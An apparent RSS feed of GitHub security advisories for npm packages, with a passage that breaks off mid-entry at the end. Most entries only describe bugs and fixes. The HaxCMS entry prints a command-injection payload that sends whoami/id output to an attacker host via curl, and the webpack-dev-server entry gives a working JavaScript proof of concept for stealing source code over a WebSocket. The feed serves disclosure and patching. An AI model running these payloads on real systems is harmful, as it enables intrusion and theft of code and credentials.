<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://xlordz.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2025-06-10T19:17:06.507Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[@vue/cli-plugin-pwa] @vue/cli-plugin-pwa Regular Expression Denial of Service vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-79vf-hf9f-j9q8</id>
        <link href="https://github.com/advisories/GHSA-79vf-hf9f-j9q8"/>
        <updated>2025-06-09T23:10:43.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in vuejs vue-cli up to 5.0.8. It has been rated as problematic. This issue affects the function HtmlPwaPlugin of the file packages/@vue/cli-plugin-pwa/lib/HtmlPwaPlugin.js of the component Markdown Code Handler. The manipulation leads to inefficient regular expression complexity. The attack may be initiated remotely.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-5897">https://nvd.nist.gov/vuln/detail/CVE-2025-5897</a></li>
<li><a href="https://github.com/vuejs/vue-cli/pull/7478">https://github.com/vuejs/vue-cli/pull/7478</a></li>
<li><a href="https://vuldb.com/?ctiid.311669">https://vuldb.com/?ctiid.311669</a></li>
<li><a href="https://vuldb.com/?id.311669">https://vuldb.com/?id.311669</a></li>
<li><a href="https://vuldb.com/?submit.585798">https://vuldb.com/?submit.585798</a></li>
<li><a href="https://github.com/advisories/GHSA-79vf-hf9f-j9q8">https://github.com/advisories/GHSA-79vf-hf9f-j9q8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-79vf-hf9f-j9q8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-09T21:30:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[taro-css-to-react-native] taro-css-to-react-native Regular Expression Denial of Service vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-f5xg-cfpj-2mw6</id>
        <link href="https://github.com/advisories/GHSA-f5xg-cfpj-2mw6"/>
        <updated>2025-06-09T23:08:48.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in tarojs taro up to 4.1.1. It has been declared as problematic. This vulnerability affects unknown code of the file taro/packages/css-to-react-native/src/index.js. The manipulation leads to inefficient regular expression complexity. The attack can be initiated remotely. Upgrading to version 4.1.2 is able to address this issue. The name of the patch is c2e321a8b6fc873427c466c69f41ed0b5e8814bf. It is recommended to upgrade the affected component.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-5896">https://nvd.nist.gov/vuln/detail/CVE-2025-5896</a></li>
<li><a href="https://github.com/NervJS/taro/pull/17619">https://github.com/NervJS/taro/pull/17619</a></li>
<li><a href="https://github.com/NervJS/taro/commit/c2e321a8b6fc873427c466c69f41ed0b5e8814bf">https://github.com/NervJS/taro/commit/c2e321a8b6fc873427c466c69f41ed0b5e8814bf</a></li>
<li><a href="https://github.com/NervJS/taro/releases/tag/v4.1.2">https://github.com/NervJS/taro/releases/tag/v4.1.2</a></li>
<li><a href="https://vuldb.com/?ctiid.311668">https://vuldb.com/?ctiid.311668</a></li>
<li><a href="https://vuldb.com/?id.311668">https://vuldb.com/?id.311668</a></li>
<li><a href="https://vuldb.com/?submit.585796">https://vuldb.com/?submit.585796</a></li>
<li><a href="https://github.com/advisories/GHSA-f5xg-cfpj-2mw6">https://github.com/advisories/GHSA-f5xg-cfpj-2mw6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f5xg-cfpj-2mw6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-09T21:30:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@haxtheweb/haxcms-nodejs] HaxCMS-PHP Command Injection Vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-g4cf-pp4x-hqgw</id>
        <link href="https://github.com/advisories/GHSA-g4cf-pp4x-hqgw"/>
        <updated>2025-06-09T21:44:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The 'gitImportSite' functionality obtains a URL string from a POST request and insufficiently validates user input. The ’set_remote’ function later passes this input into ’proc_open’, yielding OS command injection.</p>
<h3 id="details">Details</h3>
<p>The vulnerability exists in the logic of the ’gitImportSite’ function, located in ’Operations.php’. The current implementation only relies on the ’filter_var’ and 'strpos' functions to validate the URL, which is not sufficient to ensure absence of all Bash special characters used for command injection.
<img alt="gitImportSite" src="https://github.com/user-attachments/assets/af9935ef-4735-446d-833f-2c2590ff1508"></p>
<h4 id="affected-resources">Affected Resources</h4>
<p>• Operations.php:2103 gitImportSite()
• &lt;domain&gt;/&lt;user&gt;/system/api/gitImportSite</p>
<h3 id="poc">PoC</h3>
<p>To replicate this vulnerability, authenticate and send a POST request to the 'gitImportSite' endpoint with a crafted URL in the JSON data. Note, a valid token needs to be obtained by capturing a request to another API endpoint (such as 'archiveSite').</p>
<ol>
<li><p>Start a webserver.
<img alt="webserver" src="https://github.com/user-attachments/assets/8594f9b1-67fa-4352-bbc3-310bb164ec9b"></p>
</li>
<li><p>Initiate a request to the ’archiveSite’ endpoint.
<img alt="archiveSite" src="https://github.com/user-attachments/assets/08503f36-d984-4d53-8fe6-577ad78d5eb7"></p>
</li>
<li><p>Capture and modify the request in BurpSuite.
<img alt="request-modification" src="https://github.com/user-attachments/assets/61cd211e-afd3-453e-b86b-58bccffaf824"></p>
</li>
<li><p>Observe command output in the HTTP request from the server.
<img alt="command-output" src="https://github.com/user-attachments/assets/35f32274-b709-41d5-adaa-bea48f5cf33c"></p>
</li>
</ol>
<h4 id="command-injection-payload">Command Injection Payload</h4>
<pre><code class="language-Bash">http://&lt;IP&gt;/.git;curl${IFS}&lt;IP&gt;/$(whoami)/$(id)#=abcdef
</code></pre>
<h3 id="impact">Impact</h3>
<p>An authenticated attacker can craft a URL string that bypasses the validation checks employed by the ’filter_var’ and ’strpos’ functions in order to execute arbitrary OS commands on the backend server. The attacker can exfiltrate command output via an HTTP request.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/haxtheweb/issues/security/advisories/GHSA-g4cf-pp4x-hqgw">https://github.com/haxtheweb/issues/security/advisories/GHSA-g4cf-pp4x-hqgw</a></li>
<li><a href="https://github.com/haxtheweb/haxcms-nodejs/commit/5131fea6b6be611db76a618f89bd2e164752e9b3">https://github.com/haxtheweb/haxcms-nodejs/commit/5131fea6b6be611db76a618f89bd2e164752e9b3</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-49141">https://nvd.nist.gov/vuln/detail/CVE-2025-49141</a></li>
<li><a href="https://github.com/advisories/GHSA-g4cf-pp4x-hqgw">https://github.com/advisories/GHSA-g4cf-pp4x-hqgw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g4cf-pp4x-hqgw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-09T20:30:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@haxtheweb/haxcms-nodejs] @haxtheweb/haxcms-nodejs Iframe Phishing vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-v3ph-2q5q-cg88</id>
        <link href="https://github.com/advisories/GHSA-v3ph-2q5q-cg88"/>
        <updated>2025-06-09T21:44:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>In the HAX site editor, users can create a website block to load another site in an iframe. The application allows users to supply a target URL in the website block. When the HAX site is visited, the client's browser will query the supplied URL.</p>
<h3 id="affected-resources">Affected Resources</h3>
<ul>
<li><a href="https://github.com/haxtheweb/haxcms-php/blob/master/system/backend/php/lib/Operations.php#L868">Operations.php:868</a></li>
<li><code>https://&lt;site&gt;/&lt;user&gt;/system/api/saveNode</code></li>
</ul>
<h3 id="poc">PoC</h3>
<ol>
<li>Set the URL in an iframe pointing to an attacker-controlled server running Responder</li>
</ol>
<p><img alt="image" src="https://github.com/user-attachments/assets/baac23ec-7b1e-49cf-864d-c3550b2c71bf"></p>
<ol start="2">
<li>Once another user visits the site, they are prompted to sign in.</li>
</ol>
<p><img alt="image" src="https://github.com/user-attachments/assets/a3a0b75d-e12f-49cf-8669-9686353a92e2"></p>
<ol start="3">
<li>If a user inputs credentials, the username and password hash are outputted in Responder.</li>
</ol>
<p><img alt="image" src="https://github.com/user-attachments/assets/428542d3-8cf5-4bfa-b759-e630c3ee6ac3"></p>
<h3 id="impact">Impact</h3>
<p>An authenticated attacker can create a HAX site with a website block pointing at an attacker-controlled server running Responder or a similar tool. The attacker can then conduct a phishing attack by convincing another user to visit their malicious HAX site to harvest credentials.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/haxtheweb/issues/security/advisories/GHSA-v3ph-2q5q-cg88">https://github.com/haxtheweb/issues/security/advisories/GHSA-v3ph-2q5q-cg88</a></li>
<li><a href="https://github.com/haxtheweb/haxcms-nodejs/commit/5368eb9b278ca47cd9a83b8d3e6216375615b8f5">https://github.com/haxtheweb/haxcms-nodejs/commit/5368eb9b278ca47cd9a83b8d3e6216375615b8f5</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-49139">https://nvd.nist.gov/vuln/detail/CVE-2025-49139</a></li>
<li><a href="https://github.com/advisories/GHSA-v3ph-2q5q-cg88">https://github.com/advisories/GHSA-v3ph-2q5q-cg88</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v3ph-2q5q-cg88</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-09T19:07:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@directus/types] Suspended Directus user can continue to use session token to access API]]></title>
        <id>https://github.com/advisories/GHSA-56p6-qw3c-fq2g</id>
        <link href="https://github.com/advisories/GHSA-56p6-qw3c-fq2g"/>
        <updated>2025-06-09T18:12:10.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Since the user status is not checked when verifying a session token a suspended user can use the token generated in session auth mode to access the API despite their status.</p>
<h3 id="details">Details</h3>
<p>There is a check missing in <code>verifySessionJWT</code> to verify that a user is actually still active and allowed to access the API. Right now one can extract the session token obtained by, e.g. login in to the app while still active and then, after the user has been suspended continue to use that token until it expires.</p>
<h3 id="poc">PoC</h3>
<ul>
<li>Create an active user</li>
<li>Log in with that user and note the session cookie</li>
<li>Suspend the user (and don't trigger an <code>/auth/refresh</code> call, as that invalidates the session</li>
<li>Access the API with <code>Authorization: Bearer &lt;token&gt;</code></li>
</ul>
<h3 id="impact">Impact</h3>
<p>This weakens the security of suspending users.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/directus/directus/security/advisories/GHSA-56p6-qw3c-fq2g">https://github.com/directus/directus/security/advisories/GHSA-56p6-qw3c-fq2g</a></li>
<li><a href="https://github.com/directus/directus/commit/ef179931c55b50c110feca8404901d5633940771">https://github.com/directus/directus/commit/ef179931c55b50c110feca8404901d5633940771</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30351">https://nvd.nist.gov/vuln/detail/CVE-2025-30351</a></li>
<li><a href="https://github.com/advisories/GHSA-56p6-qw3c-fq2g">https://github.com/advisories/GHSA-56p6-qw3c-fq2g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-56p6-qw3c-fq2g</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-03-26T18:30:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@directus/api] Suspended Directus user can continue to use session token to access API]]></title>
        <id>https://github.com/advisories/GHSA-56p6-qw3c-fq2g</id>
        <link href="https://github.com/advisories/GHSA-56p6-qw3c-fq2g"/>
        <updated>2025-06-09T18:12:10.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Since the user status is not checked when verifying a session token a suspended user can use the token generated in session auth mode to access the API despite their status.</p>
<h3 id="details">Details</h3>
<p>There is a check missing in <code>verifySessionJWT</code> to verify that a user is actually still active and allowed to access the API. Right now one can extract the session token obtained by, e.g. login in to the app while still active and then, after the user has been suspended continue to use that token until it expires.</p>
<h3 id="poc">PoC</h3>
<ul>
<li>Create an active user</li>
<li>Log in with that user and note the session cookie</li>
<li>Suspend the user (and don't trigger an <code>/auth/refresh</code> call, as that invalidates the session</li>
<li>Access the API with <code>Authorization: Bearer &lt;token&gt;</code></li>
</ul>
<h3 id="impact">Impact</h3>
<p>This weakens the security of suspending users.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/directus/directus/security/advisories/GHSA-56p6-qw3c-fq2g">https://github.com/directus/directus/security/advisories/GHSA-56p6-qw3c-fq2g</a></li>
<li><a href="https://github.com/directus/directus/commit/ef179931c55b50c110feca8404901d5633940771">https://github.com/directus/directus/commit/ef179931c55b50c110feca8404901d5633940771</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30351">https://nvd.nist.gov/vuln/detail/CVE-2025-30351</a></li>
<li><a href="https://github.com/advisories/GHSA-56p6-qw3c-fq2g">https://github.com/advisories/GHSA-56p6-qw3c-fq2g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-56p6-qw3c-fq2g</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-03-26T18:30:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[directus] Suspended Directus user can continue to use session token to access API]]></title>
        <id>https://github.com/advisories/GHSA-56p6-qw3c-fq2g</id>
        <link href="https://github.com/advisories/GHSA-56p6-qw3c-fq2g"/>
        <updated>2025-06-09T18:12:10.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Since the user status is not checked when verifying a session token a suspended user can use the token generated in session auth mode to access the API despite their status.</p>
<h3 id="details">Details</h3>
<p>There is a check missing in <code>verifySessionJWT</code> to verify that a user is actually still active and allowed to access the API. Right now one can extract the session token obtained by, e.g. login in to the app while still active and then, after the user has been suspended continue to use that token until it expires.</p>
<h3 id="poc">PoC</h3>
<ul>
<li>Create an active user</li>
<li>Log in with that user and note the session cookie</li>
<li>Suspend the user (and don't trigger an <code>/auth/refresh</code> call, as that invalidates the session</li>
<li>Access the API with <code>Authorization: Bearer &lt;token&gt;</code></li>
</ul>
<h3 id="impact">Impact</h3>
<p>This weakens the security of suspending users.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/directus/directus/security/advisories/GHSA-56p6-qw3c-fq2g">https://github.com/directus/directus/security/advisories/GHSA-56p6-qw3c-fq2g</a></li>
<li><a href="https://github.com/directus/directus/commit/ef179931c55b50c110feca8404901d5633940771">https://github.com/directus/directus/commit/ef179931c55b50c110feca8404901d5633940771</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-30351">https://nvd.nist.gov/vuln/detail/CVE-2025-30351</a></li>
<li><a href="https://github.com/advisories/GHSA-56p6-qw3c-fq2g">https://github.com/advisories/GHSA-56p6-qw3c-fq2g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-56p6-qw3c-fq2g</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-03-26T18:30:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[angular-sanitize] AngularJS Incomplete Filtering of Special Elements vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-4p4w-6hg8-63wx</id>
        <link href="https://github.com/advisories/GHSA-4p4w-6hg8-63wx"/>
        <updated>2025-06-06T23:38:47.000Z</updated>
        <content type="html"><![CDATA[<p>Improper sanitization of the value of the 'href' and 'xlink:href' attributes in '<img>' SVG elements in AngularJS's&nbsp;'ngSanitize'&nbsp;module allows attackers to bypass common image source restrictions. This can lead to a form of  Content Spoofing <a href="https://owasp.org/www-community/attacks/Content_Spoofing">https://owasp.org/www-community/attacks/Content_Spoofing</a> &nbsp;and also negatively affect the application's performance and behavior by using too large or slow-to-load images.</p>
<p>This issue affects AngularJS versions greater than or equal to 1.3.1.</p>
<p>Note:
The AngularJS project is End-of-Life and will not receive any updates to address this issue. For more information see  here <a href="https://docs.angularjs.org/misc/version-support-status">https://docs.angularjs.org/misc/version-support-status</a> .</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-2336">https://nvd.nist.gov/vuln/detail/CVE-2025-2336</a></li>
<li><a href="https://codepen.io/herodevs/pen/bNGYaXx/412a3a4218387479898912f60c269c6c">https://codepen.io/herodevs/pen/bNGYaXx/412a3a4218387479898912f60c269c6c</a></li>
<li><a href="https://www.herodevs.com/vulnerability-directory/cve-2025-2336">https://www.herodevs.com/vulnerability-directory/cve-2025-2336</a></li>
<li><a href="https://www.herodevs.com/vulnerability-directory/cve-2025-2336?angularjs-nes">https://www.herodevs.com/vulnerability-directory/cve-2025-2336?angularjs-nes</a></li>
<li><a href="https://github.com/advisories/GHSA-4p4w-6hg8-63wx">https://github.com/advisories/GHSA-4p4w-6hg8-63wx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4p4w-6hg8-63wx</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-04T18:30:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[multer] Multer vulnerable to Denial of Service via unhandled exception]]></title>
        <id>https://github.com/advisories/GHSA-g5hg-p3ph-g8qg</id>
        <link href="https://github.com/advisories/GHSA-g5hg-p3ph-g8qg"/>
        <updated>2025-06-05T01:09:36.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A vulnerability in Multer versions &gt;=1.4.4-lts.1, &lt;2.0.1 allows an attacker to trigger a Denial of Service (DoS) by sending an upload file request with an empty string field name. This request causes an unhandled exception, leading to a crash of the process.</p>
<h3 id="patches">Patches</h3>
<p>Users should upgrade to <code>2.0.1</code></p>
<h3 id="workarounds">Workarounds</h3>
<p>None</p>
<h3 id="references">References</h3>
<p><a href="https://github.com/expressjs/multer/commit/35a3272b611945155e046dd5cef11088587635e9">https://github.com/expressjs/multer/commit/35a3272b611945155e046dd5cef11088587635e9</a>
<a href="https://github.com/expressjs/multer/issues/1233">https://github.com/expressjs/multer/issues/1233</a>
<a href="https://github.com/expressjs/multer/pull/1256">https://github.com/expressjs/multer/pull/1256</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/expressjs/multer/security/advisories/GHSA-g5hg-p3ph-g8qg">https://github.com/expressjs/multer/security/advisories/GHSA-g5hg-p3ph-g8qg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48997">https://nvd.nist.gov/vuln/detail/CVE-2025-48997</a></li>
<li><a href="https://github.com/expressjs/multer/issues/1233">https://github.com/expressjs/multer/issues/1233</a></li>
<li><a href="https://github.com/expressjs/multer/pull/1256">https://github.com/expressjs/multer/pull/1256</a></li>
<li><a href="https://github.com/expressjs/multer/commit/35a3272b611945155e046dd5cef11088587635e9">https://github.com/expressjs/multer/commit/35a3272b611945155e046dd5cef11088587635e9</a></li>
<li><a href="https://github.com/advisories/GHSA-g5hg-p3ph-g8qg">https://github.com/advisories/GHSA-g5hg-p3ph-g8qg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g5hg-p3ph-g8qg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-05T01:09:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@haxtheweb/open-apis] Unauthenticated Disclosure of PSU HAX CMS Site Listings via haxPsuUsage API Endpoint]]></title>
        <id>https://github.com/advisories/GHSA-fvx2-x7ff-fc56</id>
        <link href="https://github.com/advisories/GHSA-fvx2-x7ff-fc56"/>
        <updated>2025-06-05T01:07:47.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>An <strong>unauthenticated information disclosure vulnerability</strong> exists in the PSU deployment of HAX CMS via the <code>haxPsuUsage</code> API endpoint. This allows <strong>any remote unauthenticated user</strong> to retrieve a full list of PSU websites hosted on HAX CMS. When chained with other authorization issues (e.g., HAX-3), this could assist in targeted attacks such as unauthorized content modification or deletion.</p>
<hr>
<h3 id="details">Details</h3>
<p>The endpoint <a href="https://open-apis.hax.cloud/api/services/stats/haxPsuUsage"><code>https://open-apis.hax.cloud/api/services/stats/haxPsuUsage</code></a> returns a list of websites on the PSU instance of HAX CMS. This endpoint is exposed without any authentication or authorization checks.</p>
<p>The source of the issue is in the <code>haxPsuUsage.js</code> file, which appears to directly serve the site listing without verifying user identity or access level. This enables anyone with the endpoint URL to enumerate all site instances under the PSU deployment.</p>
<p>This endpoint may have originally been used for internal or statistical purposes but is now publicly accessible, representing a privacy and enumeration risk.</p>
<hr>
<h3 id="poc">PoC</h3>
<p>To reproduce this vulnerability:</p>
<ol>
<li>Open a terminal or browser.</li>
<li>Send a GET request to the following endpoint:<pre><code class="language-bash">curl https://open-apis.hax.cloud/api/services/stats/haxPsuUsage
</code></pre>
</li>
</ol>
<hr>
<h3 id="impact">Impact</h3>
<p>The <code>haxPsuUsage</code> endpoint exposes a full list of PSU HAX CMS websites to <strong>any unauthenticated user</strong>, allowing external actors to enumerate all sites under the PSU domain. This alone represents an information disclosure vulnerability.</p>
<p>When <strong>chained with the Lack Of Authorization Checks CVE</strong>, which involves missing authorization checks on key API endpoints, the risk escalates significantly. An <strong>authenticated attacker</strong> can:</p>
<ul>
<li>Modify or delete other users' sites via:<ul>
<li><code>createNode()</code>, <code>saveNode()</code>, <code>deleteNode()</code></li>
</ul>
</li>
<li>Access sensitive metadata or credentials:<ul>
<li><code>getConfig()</code>, <code>downloadSite()</code></li>
</ul>
</li>
<li>Clone or remove entire sites:<ul>
<li><code>cloneSite()</code>, <code>deleteSite()</code>, <code>archiveSite()</code></li>
</ul>
</li>
</ul>
<p>Combined, these issues allow a low-privileged user to <strong>fully compromise any site</strong> in the PSU HAX CMS instance.</p>
<p>This vulnerability chain puts <strong>content integrity, availability, and confidentiality</strong> at risk for potentially hundreds of PSU academic, instructional, and departmental sites.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/haxtheweb/issues/security/advisories/GHSA-fvx2-x7ff-fc56">https://github.com/haxtheweb/issues/security/advisories/GHSA-fvx2-x7ff-fc56</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48996">https://nvd.nist.gov/vuln/detail/CVE-2025-48996</a></li>
<li><a href="https://github.com/haxtheweb/open-apis/commit/06c2e1fbb7131a8fe66aa0600f38dcacae6b7ac7">https://github.com/haxtheweb/open-apis/commit/06c2e1fbb7131a8fe66aa0600f38dcacae6b7ac7</a></li>
<li><a href="https://github.com/advisories/GHSA-fvx2-x7ff-fc56">https://github.com/advisories/GHSA-fvx2-x7ff-fc56</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fvx2-x7ff-fc56</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-05T01:07:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@auth0/nextjs-auth0] NextJS-Auth0 SDK Vulnerable to CDN Caching of Session Cookies]]></title>
        <id>https://github.com/advisories/GHSA-f3fg-mf2q-fj3f</id>
        <link href="https://github.com/advisories/GHSA-f3fg-mf2q-fj3f"/>
        <updated>2025-06-04T22:57:22.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Overview</strong>
In Auth0 Next.js SDK versions 4.0.1 to 4.6.0, __session cookies set by auth0.middleware may be cached by CDNs due to missing Cache-Control headers.</p>
<p><strong>Am I Affected?</strong>
You are affected by this vulnerability if you meet the following preconditions:</p>
<ol>
<li>Applications using the NextJS-Auth0 SDK, versions between 4.0.1 to 4.6.0,</li>
<li>Applications using CDN or edge caching that caches responses with the Set-Cookie header.</li>
<li>If the Cache-Control header is not properly set for sensitive responses.</li>
</ol>
<p><strong>Fix</strong>
Upgrade auth0/nextjs-auth0 to v4.6.1.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/auth0/nextjs-auth0/security/advisories/GHSA-f3fg-mf2q-fj3f">https://github.com/auth0/nextjs-auth0/security/advisories/GHSA-f3fg-mf2q-fj3f</a></li>
<li><a href="https://github.com/auth0/nextjs-auth0/commit/12a62ca596db3b0827b39a4b865b882423e7cb1e">https://github.com/auth0/nextjs-auth0/commit/12a62ca596db3b0827b39a4b865b882423e7cb1e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48947">https://nvd.nist.gov/vuln/detail/CVE-2025-48947</a></li>
<li><a href="https://github.com/advisories/GHSA-f3fg-mf2q-fj3f">https://github.com/advisories/GHSA-f3fg-mf2q-fj3f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f3fg-mf2q-fj3f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-06-04T21:24:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[webpack-dev-server] webpack-dev-server users' source code may be stolen when they access a malicious web site with non-Chromium based browser]]></title>
        <id>https://github.com/advisories/GHSA-9jgg-88mc-972h</id>
        <link href="https://github.com/advisories/GHSA-9jgg-88mc-972h"/>
        <updated>2025-06-04T21:09:39.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Source code may be stolen when you access a malicious web site with non-Chromium based browser.</p>
<h3 id="details">Details</h3>
<p>The <code>Origin</code> header is checked to prevent Cross-site WebSocket hijacking from happening which was reported by CVE-2018-14732.
But webpack-dev-server always allows IP address <code>Origin</code> headers.
<a href="https://github.com/webpack/webpack-dev-server/blob/55220a800ba4e30dbde2d98785ecf4c80b32f711/lib/Server.js#L3113-L3127">https://github.com/webpack/webpack-dev-server/blob/55220a800ba4e30dbde2d98785ecf4c80b32f711/lib/Server.js#L3113-L3127</a>
This allows websites that are served on IP addresses to connect WebSocket.
By using the same method described in <a href="https://blog.cal1.cn/post/Sniffing%20Codes%20in%20Hot%20Module%20Reloading%20Messages">the article</a> linked from CVE-2018-14732, the attacker get the source code.</p>
<p>related commit: <a href="https://github.com/webpack/webpack-dev-server/commit/72efaab83381a0e1c4914adf401cbd210b7de7eb">https://github.com/webpack/webpack-dev-server/commit/72efaab83381a0e1c4914adf401cbd210b7de7eb</a> (note that <code>checkHost</code> function was only used for Host header to prevent DNS rebinding attacks so this change itself is fine.</p>
<p>This vulnerability does not affect Chrome 94+ (and other Chromium based browsers) users due to <a href="https://developer.chrome.com/blog/private-network-access-update#chrome_94">the non-HTTPS private access blocking feature</a>.</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Download <a href="https://github.com/user-attachments/files/18418233/reproduction.zip">reproduction.zip</a> and extract it</li>
<li>Run <code>npm i</code></li>
<li>Run <code>npx webpack-dev-server</code></li>
<li>Open <code>http://{ipaddress}/?target=http://localhost:8080&amp;file=main</code> with a non-Chromium browser (I used Firefox 134.0.1)</li>
<li>Edit <code>src/index.js</code> in the extracted directory</li>
<li>You can see the content of <code>src/index.js</code></li>
</ol>
<p><img alt="image" src="https://github.com/user-attachments/assets/7ce3cad7-1a4d-4778-baae-1adae5e93ba4"></p>
<p>The script in the POC site is:</p>
<pre><code class="language-js">window.webpackHotUpdate = (...args) =&gt; {
    console.log(...args);
    for (i in args[1]) {
        document.body.innerText = args[1][i].toString() + document.body.innerText
        console.log(args[1][i])
    }
}

let params = new URLSearchParams(window.location.search);
let target = new URL(params.get('target') || 'http://127.0.0.1:8080');
let file = params.get('file')
let wsProtocol = target.protocol === 'http:' ? 'ws' : 'wss';
let wsPort = target.port;
var currentHash = '';
var currentHash2 = '';
let wsTarget = `${wsProtocol}://${target.hostname}:${wsPort}/ws`;
ws = new WebSocket(wsTarget);
ws.onmessage = event =&gt; {
    console.log(event.data);
    if (event.data.match('"type":"ok"')) {
        s = document.createElement('script');
        s.src = `${target}${file}.${currentHash2}.hot-update.js`;
        document.body.appendChild(s)
    }
    r = event.data.match(/"([0-9a-f]{20})"/);
    if (r !== null) {
        currentHash2 = currentHash;
        currentHash = r[1];
        console.log(currentHash, currentHash2);
    }
}
</code></pre>
<h3 id="impact">Impact</h3>
<p>This vulnerability can result in the source code to be stolen for users that uses a predictable port and uses a non-Chromium based browser.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-9jgg-88mc-972h">https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-9jgg-88mc-972h</a></li>
